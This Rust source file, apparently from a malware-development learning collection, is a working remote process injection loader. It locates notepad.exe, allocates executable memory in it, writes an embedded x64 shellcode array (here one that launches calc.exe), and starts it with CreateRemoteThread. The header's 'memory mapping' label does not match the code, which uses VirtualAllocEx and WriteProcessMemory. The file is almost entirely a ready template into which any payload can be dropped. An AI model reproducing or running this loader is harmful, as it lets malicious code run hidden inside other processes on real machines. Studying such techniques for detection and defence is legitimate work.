/*
    Remote Memory Mapping Injection
    Special Thanks to MaldevAcademy. These technique was leaned from their resource ...
    @5mukx
*/
use std::{
    ffi::CString,
    ptr::null_mut,
    mem::transmute,
};
use winapi::{
    shared::{
        minwindef::FALSE, ntdef::PVOID
    },
    um::{
        errhandlingapi::GetLastError, handleapi::CloseHandle, memoryapi::{VirtualAllocEx, WriteProcessMemory}, processthreadsapi::{CreateRemoteThread, OpenProcess}, synchapi::WaitForSingleObject, tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS}, winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS}
    },
};

macro_rules! err {
    ($msg:expr, $($arg:expr), *) => {
        println!("[-] {}", format!($msg, $($arg), *));
    }
}

macro_rules! okey {
    ($msg:expr) => {
        println!("[+] {}", format!($msg));
    }
}
fn get_pid(process_name: &str) -> u32 {
    unsafe {
        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap.is_null() {
            err!("Error while snapshotting processes: Error: {}", GetLastError());
            std::process::exit(0);
        }

        let mut pid = 0;

        let mut result = Process32First(snap, &mut pe) != 0;

        while result {
            let exe_file = CString::from_vec_unchecked(
                pe.szExeFile
                    .iter()
                    .map(|&file| file as u8)
                    .take_while(|&c| c != 0)
                    .collect::<Vec<u8>>(),
            );

            if exe_file.to_str().unwrap() == process_name {
                pid = pe.th32ProcessID;
                break;
            }
            result = Process32Next(snap, &mut pe) != 0;
        }

        if pid == 0 {
            err!("Unable to get PID for {}: {}", process_name, "PROCESS DOESN'T EXIST");
            std::process::exit(0);
        }

        CloseHandle(snap);
        pid
    }
}

fn main() {
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    unsafe {
        let process_id = get_pid("notepad.exe");

        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
        if process_handle.is_null() {
            err!("Error: Failed to open process: {}",GetLastError());
            return;
        }

        let allocated_memory = VirtualAllocEx(
            process_handle,
            null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if allocated_memory.is_null() {
            err!("Error: Failed to allocate memory in remote process: {}",GetLastError());
            return;
        }

        if WriteProcessMemory(process_handle, allocated_memory, shellcode.as_ptr() as PVOID, shellcode.len(), null_mut()) == 0 {
            err!("Error: Failed to write shellcode to remote process: {}",GetLastError());
            return;
        }

        let thread_handle = CreateRemoteThread(
            process_handle,
            null_mut(),
            0,
            transmute(allocated_memory),
            null_mut(),
            0,
            null_mut(),
        );
        if thread_handle.is_null() {
            err!("Error: Failed to create remote thread :{}",GetLastError());
            return;
        }

        let wait_result = WaitForSingleObject(thread_handle, winapi::um::winbase::INFINITE);
        if wait_result != winapi::um::winbase::WAIT_OBJECT_0 {
            err!("Error: WaitForSingleObject failed : {}",GetLastError());
            return;
        }

        okey!("Shellcode executed successfully");
    }
}

